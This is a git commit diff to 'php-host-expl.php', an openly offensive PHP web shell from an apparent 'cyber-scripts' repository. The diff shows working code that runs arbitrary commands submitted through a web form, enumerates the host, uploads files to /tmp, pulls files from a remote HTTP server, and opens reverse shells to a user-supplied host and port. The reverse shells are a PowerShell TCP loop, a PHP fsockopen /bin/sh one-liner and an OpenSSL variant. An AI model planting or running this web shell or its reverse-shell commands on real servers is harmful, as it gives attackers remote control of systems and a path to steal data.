2be125a7e837713964f3a3f91924191d30d449c6
isabellecda <7978895+isabellecda@users.noreply.github.com>
2021-06-09 10:24:22 -0300

    Update php-host-expl.php

--- php-host-expl.php
+++ php-host-expl.php
@@ -1,23 +1,27 @@
 <!DOCTYPE html>
-<html>
 <!-- Simple host exploration script: basic host enumeration using PHP -->
 <!-- https://github.com/isabellecda/cyber-scripts -->
+<html>
+	<b>
 	<!-- Defines PHP function to sent the commands. Verifies disabled_functions. -->
 	<?php
-		// Check OS - Only Linux and Windows supported.
+		// Check OS - Only Linux and Windows supported
 		$os = php_uname('s');
 
 		if("$os" != "Linux" and "$os" != "Windows") {
-			echo 'OS not supported.';
-			exit();
+			echo 'Not supported, commands set for Linux';
+			$os = "Linux";
 		}
 
-		echo "OS: $os --- ";
+		echo "OS: $os -- ";
 
 		// Check disabled functions
 		function is_available($func) {
 			$available = true;
-			if (ini_get('safe_mode')) {
+
+			if (!is_callable($func)) {
+			    $available = false;
+			} else if (ini_get('safe_mode')) {
 			    $available = false;
 			} else {
 			    $d = ini_get('disable_functions');
@@ -33,39 +37,39 @@
 			return $available;
 		}
 
+		// Flag to disable some functionality if no function is available
 		$disabled = "";
 
-		echo "Using PHP function: ";
 		if(is_available('system')) {
-			echo 'system()';
 			$cmdType = 'system';
 		} else if(is_available('passthru')) {
-			echo 'passthru()';
 			$cmdType = 'passthru';
 		}  else if(is_available('shell_exec')) {
-			echo 'shell_exec()';
 			$cmdType = 'shell_exec';
 		}   else if(is_available('exec')) {
-			echo 'exec()';
 			$cmdType = 'exec';
 		} else {
-			echo "Attention! Functions 'system', 'passthru', 'shell_exec' and 'exec' are disabled. Some buttons won't work.";
-			$disabled = "disabled";
+			$disabled = 'disabled';
 		}
 
+		echo 'Using PHP function: ';
+		echo ($disabled == 'disabled') ? "Attention! Functions 'system', 'passthru', 'shell_exec' and 'exec' are disabled. Some buttons won't work." : $cmdType . '()';
 	?>
+	</b>
 	<br><br>
 
+	<!-- Commands sent using POST method-->
 	<form  method="POST">
 		Command:
-		<!-- Commands sent using POST method-->
 		<input type="text" name="mycmd" placeholder="id" autofocus required <?php echo $disabled?>>
         	<input type="submit" name="btnPost" value="POST" <?php echo $disabled?>>
 	</form>
 
 	<br>
 
+	<!-- Server enumeration -->
         <form  method="POST">
+		Enumeration:
 		<!-- Basic enum commands -->
 		<input type="submit" name="btnEnum" value="Simple Enum" <?php echo $disabled?>>
 
@@ -75,28 +79,30 @@
 
 	<br>
 
-	<form action="#" method="post" enctype="multipart/form-data">
-		Upload: <input type="file" name="arquivo" />
-		<input type="submit" name="btnMultipart" value="Enviar"/>
-	</form>
-
-	<br>
-
+	<!-- Reverse shell -->
 	<form  method="POST">
 		Reverse Shell:
 		<!-- Will try to get a reverse shell -->
 		<!-- Handler must be listening at the defined host and port -->
 		<input type="text" name="lhost" placeholder="192.168.0.1" size="15" required <?php echo $disabled?>>
 		<input type="text" name="lport" placeholder="8000" size="5" required <?php echo $disabled?>>
-		<input type="submit" name="btnBash" value="Reverse_BashSockets" <?php echo $disabled?>>
-		<input type="submit" name="btnPhp" value="Reverse_PHP" <?php echo $disabled?>>
-		<input type="submit" name="btnSSL" value="Reverse_OpenSSL">
+		<input type="submit" name="btnSockets" value="Reverse Sockets" <?php echo $disabled?>>
+		<input type="submit" name="btnPhp" value="Reverse PHP" <?php echo $disabled?>>
+		<input type="submit" name="btnSSL" value="Reverse OpenSSL">
+	</form>
+
+	<br>
+
+	<!-- Uploads file -->
+	<form action="#" method="POST" enctype="multipart/form-data">
+		PHP file upload: <input type="file" name="uploadedFile" />
+		<input type="submit" name="btnMultipart" value="Send"/>
 	</form>
 
 	<br>
 
         <form  method="POST">
-		HTTP Server:
+		File download using Remote HTTP Server:
 		<!-- HTTP server must be available at the defined host and port -->
 		<!-- File will be downloaded from the HTTP server (http://host:port/fileName) to the PHP server (/tmp/fileName) -->
 		<input type="text" name="fileHost" placeholder="192.168.0.1"  size="15" required>
@@ -107,43 +113,49 @@
 	</form>
 </html>
 <?php
+	// Client disconnect will not abort script
 	ignore_user_abort(true);
+
+	// Maximum execution time in seconds
 	set_time_limit(8000);
+
 	// Executes a system command and exit
 	function exec_cmd_and_exit($type, $cmd) {
 		echo "# $cmd";
 	        echo '<br><br>';
+		echo '<pre>';
 
 		switch($type) {
 			case 'passthru':
-				echo '<pre>';
 				passthru("$cmd 2>&1", $return_value);
-				echo '</pre>';
-			  	($return_value == 0) or die();
+			  	//($return_value == 0) or die();
 				break;
 			case 'shell_exec':
-				echo '<pre>';
 				echo (shell_exec("$cmd 2>&1"));
-				echo '</pre>';
 				break;
 			case 'exec':
 				exec("$cmd 2>&1", $array);
-				echo '<pre>';
 				foreach ($array as &$value) {
 		    			echo ("$value \n");;
 				}
-				echo '</pre>';
 				break;
 			default:
-				echo '<pre>';
 				system("$cmd 2>&1", $return_value);
-				echo '</pre>';
 		  		($return_value == 0) or die();
 		}
+
+		echo '</pre>';
 		exit();
 	}
 
 	echo '<br><hr><br>';
+
+	// Default cmd exec
+	if (isset($_REQUEST['btnPost']))
+	{
+		$cmd = $_REQUEST['mycmd'];
+		exec_cmd_and_exit($cmdType, $cmd);
+	}
 
 	// Calls phpinfo()
 	if (isset($_REQUEST['btnPhpInfo']))
@@ -169,8 +181,8 @@
 		exec_cmd_and_exit($cmdType, $cmd);
 	}
 
-	// Reverse Default
-	if (isset($_REQUEST['btnBash'])) {
+	// Reverse Sockets
+	if (isset($_REQUEST['btnSockets'])) {
 
 		$winSocketShell = 'powershell.exe;$client = New-Object System.Net.Sockets.' . "TCPClient($lhost,$lport)" . ';$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()' ;
 
@@ -181,11 +193,13 @@
 		exec_cmd_and_exit($cmdType, $cmd);
 	}
 
+	// Reverse PHP
 	if (isset($_REQUEST['btnPhp'])) {
         	$cmd = "php -r '\$sock=fsockopen(\"$lhost\",$lport);exec(\"/bin/sh -i <&3 >&3 2>&3\");'";
 		exec_cmd_and_exit($cmdType, $cmd);
 	}
 
+	// Reverse OpenSSL
         if (isset($_REQUEST['btnSSL'])) {
 		$randFile = rand(5, 100000);
 
@@ -193,8 +207,26 @@
                 exec_cmd_and_exit($cmdType, $cmd);
         }
 
+	// Process file upload
+	if (isset($_REQUEST['btnMultipart'])) {
+		$dir = '/tmp';
 
-	// Process file download
+		// Multipart file
+		$file = $_FILES['uploadedFile'];
+		$uploadDest = "$dir/".$file['name'];
+
+		// Moves file to /tmp folder
+		if (move_uploaded_file($file['tmp_name'], $uploadDest)) { 
+	    		echo "Success! Uploaded file can be found at $uploadDest"; 
+		} 
+		else { 
+	    		echo 'Error. Could not upload file.'; 
+		}
+
+		exit();
+	}
+
+	// Process file download from HTTP Server
 	$fileFrom = "http://$fileHost:$filePort/$fileName";
 
 	$fileTo = "$os" == "Linux" ?
@@ -212,29 +244,11 @@
 		echo "# file_put_contents($fileTo, file_get_contents($fileFrom))";
 		echo '<br><br>';
         	if (file_put_contents($fileTo, file_get_contents($fileFrom))) {
-			echo 'File downloaded successfully!';
+			echo "Success! Downloaded file can be found at $fileTo";
 		} else {
-			echo 'File downloading failed.';
+			echo 'Error. Could not download file.';
 		}
 		exit();
     	}
-
-	
-	if (isset($_REQUEST['btnMultipart'])) {
-		$dir = "/tmp";
-		// recebendo o arquivo multipart 
-		$file = $_FILES["arquivo"]; 
-		// Move o arquivo da pasta temporaria de upload para a pasta de destino 
-		if (move_uploaded_file($file["tmp_name"], "$dir/".$file["name"])) { 
-	    		echo "# Arquivo enviado com sucesso para a pasta $dir/ "; 
-		} 
-		else { 
-	    		echo "# Erro ao enviar o arquivo "; 
-		}
-	}
-
-	// Default cmd exec
-	$cmd = $_REQUEST['mycmd'];
-	exec_cmd_and_exit($cmdType, $cmd);
 
 ?>
